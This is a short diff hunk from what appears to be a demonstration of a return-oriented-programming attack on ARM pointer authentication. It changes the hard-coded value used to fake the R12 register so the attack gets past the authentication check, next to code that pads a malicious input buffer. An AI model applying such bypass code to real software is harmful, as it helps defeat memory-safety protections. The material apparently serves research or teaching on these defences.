@@ -284,7 +284,7 @@ static void demo_rop_attack_with_pac_1(void)
     memset(malicious_input, 'A', offset);
 	
 	  // Fake R12 to bypass AUT
-	  uint32_t value = 0xf4e3f83a; //0x741e09d4;
+	  uint32_t value = 0xF7FB8DA5; //0x741e09d4;
 	  memcpy(malicious_input + offset, &value, sizeof(value));
     offset += sizeof(value);
 	
